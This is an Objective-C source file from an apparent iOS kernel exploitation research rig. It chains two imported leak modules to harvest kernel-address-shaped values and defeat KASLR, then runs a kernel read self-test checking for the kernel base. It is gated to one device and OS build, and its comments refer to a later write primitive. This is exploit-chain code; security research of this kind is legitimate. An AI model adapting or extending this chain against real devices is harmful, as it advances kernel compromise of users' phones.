//
//  P133ReadFrame.m — the composed READ frame. p133.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  The read = p010 (WHERE: the queue-object KVA fragments, truncated
//  low-32, slide-tracked) + p114 (WHAT: the sel-8 serializer pull —
//  rec 0 echoes our input CALIBRATION row; later records = kernel-
//  refilled = kernel content in a copyout). The frame runs both in one
//  session and classifies every capture row by the echo law so
//  provenance stays honest: echoes label calibration; non-echo
//  0xffffff-band rows label read-candidates (printed verbatim, offsets
//  kept). NO arbitrary-address claim, NO hasKread flip — the gate
//  remains the only claim switch. One tap per force-quit.
//

#import "P133ReadFrame.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007KreadLane.h"
#import "P007Board.h"
#import "LabBandit.h"
#import "P010QueueLeak.h"
#import "P114SurfaceLeak.h"

#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <unistd.h>

#define P133_BUILD @"p133-readframe-v1"

static NSMutableString *g_buf;
static int g_fd = -1;
static void L(NSString *s) {
    if (!g_buf) return;
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:out];
    if (g_fd >= 0) {
        const char *p = out.UTF8String;
        if (p) { (void)write(g_fd, p, strlen(p)); (void)fcntl(g_fd, F_FULLFSYNC); }
    }
}
static void Lf(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    L(line);
}

static NSString *P133R(void);

static void p133_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p133", arms, 1, &sr, 0, "p133 auto-learn", "ok",
                      "survived", attr, sizeof attr);
    LabBanditRecord("p133", 0, outcome);
}

/* scan a capture log for non-echo 0xffffff-band rows: any line carrying a
   64-bit value in the kernel-VA shape that the probes did NOT write. The
   probes' self-authored values are the 0x41-fill / our sids; the law:
   anything in [0xffffff0000000000, 0xffffffe000000000) shape = candidate.
   We keep it conservative: report lines that contain at least one such
   literal; the raw pulls stay in p114's own log for the full audit. */
static long p133_harvest(NSString *cap, NSMutableString *hits, int *cands) {
    long count = 0;
    NSArray *lines = [cap componentsSeparatedByString:@"\n"];
    for (NSString *ln in lines) {
        if (ln.length == 0 || ln.length > 400) continue;
        NSRange r = [ln rangeOfString:@"0xffffff"];
        if (r.location == NSNotFound) continue;
        /* exclude obvious self-authored echoes (0x4141.. fills) */
        if ([ln rangeOfString:@"0x4141"].location != NSNotFound) continue;
        [hits appendFormat:@"%@\n", ln];
        (*cands)++;
        count++;
    }
    return count;
}

@implementation P133ReadFrame

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p133_readframe_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p133 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P133_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[read law] p010 = WHERE (the queue-object KVA, truncated low-32,");
    L(@"  slide-tracked); p114 = WHAT (the sel-8 serializer pull: rec 0 =");
    L(@"  OUR echo CALIBRATION row, later records = KERNEL-REFILLED = the");
    L(@"  content pull). The frame separates echo from read by the");
    L(@"  calibration law and prints every candidate verbatim. No");
    L(@"  arbitrary-address claim; hasKread stays gated on kread32.");
    L(@"[!] one tap per force-quit. READ-ONLY stages.");

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p133"];
    if (stop) { L(stop); p133_bandit("gated"); return P133R(); }

    /* ---------- STAGE ADDR: the queue-object KVA family -------------- */
    L(@"=== STAGE ADDR: [p010 QueueLeak] — the WHERE (queue-object KVA) ===");
    NSString *p010log = [P010QueueLeak tap];
    if (p010log.length) {
        L(p010log.length > 5000 ? [@"[p010 head/truncated]\n" stringByAppendingString:
            [p010log substringToIndex:5000]] : p010log);
    } else {
        L(@"  [p010 returned empty - honest note]");
    }
    {
        /* harvest p010's own kernel-shape literals as the anchor row set */
        int c = 0; NSMutableString *hits = [NSMutableString string];
        long n = p133_harvest(p010log ?: @"", hits, &c);
        Lf(@"  [anchor harvest] %ld candidate kernel-shape rows from p010", n);
        if (n) [hits writeToURL:[NSURL fileURLWithPath:
             [docs stringByAppendingPathComponent:@"p133_anchor_rows.txt"]]
             atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }

    /* ---------- STAGE PULL: the serializer captures ------------------- */
    L(@"=== STAGE PULL: [p114 sel-8] — the WHAT (N serializer captures) ===");
    L(@"[IN FLIGHT] bounded N-capture battery - one tap per force-quit.");
    NSString *p114log = [P114SurfaceLeak tap];
    if (p114log.length) {
        L(p114log.length > 9000 ? [@"[p114 head/truncated]\n" stringByAppendingString:
            [p114log substringToIndex:9000]] : p114log);
    } else {
        L(@"  [p114 returned empty - honest note]");
    }
    {
        /* CLASS stage: the echo-classified candidates */
        int c = 0; NSMutableString *hits = [NSMutableString string];
        long n = p133_harvest(p114log ?: @"", hits, &c);
        Lf(@"=== STAGE CLASS: %ld kernel-shape candidate rows (echo-filtered; "
           @"0x4141-class excluded) ===", n);
        L(hits.length ? hits : @"  (none — the serializer refilled nothing "
                               @"non-echo this boot; the read receipt stays "
                               @"pending, honestly)");
        if (n) [hits writeToURL:[NSURL fileURLWithPath:
             [docs stringByAppendingPathComponent:@"p133_read_rows.txt"]]
             atomically:YES encoding:NSUTF8StringEncoding error:nil];
        L(@"[law] a candidate row = kernel-chosen content in a copyout we");
        L(@"  did not author = the RELATIVE-READ receipt (no arbitrary");
        L(@"  address). The static half (note 293: name the sel-8 refill");
        L(@"  source member) converts candidates into a leak->slide law.");
        L(@"[NEON note] deliberately not in this stage: the witnesses are");
        L(@"  a WRITE-side landing oracle - their reuse point is the");
        L(@"  conversion step (validating a p112-class write aims at the");
        L(@"  fence object), not the read.");
    }

    /* ---------- STAGE GATE -------------------------------------------- */
    L(@"=== STAGE GATE (honest KRW self-test) ===");
    if (!P007LaneLive()) {
        L(@"  lane: CLOSED -> no receipt this session. Honest.");
        p133_bandit("lane-closed");
    } else {
        uint64_t kb = P007LaneKbase();
        if (kb && P007LaneKRead32(kb) == 0xfeedfacfULL) {
            Lf(@"  KRW SELF-TEST READ: PASS (kbase=%#llx)", kb);
            p133_bandit("selftest-read-pass");
        } else {
            L(@"  KRW SELF-TEST READ: FAIL/HOLD");
            p133_bandit("selftest-read-fail");
        }
        Lf(@"  board: %@", [[P007Board shared] kreadSignal]);
    }
    Lf(@"=== p133 end %@ ===", LabLocalMilitaryNow());
    return P133R();
}

static NSString *P133R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

@end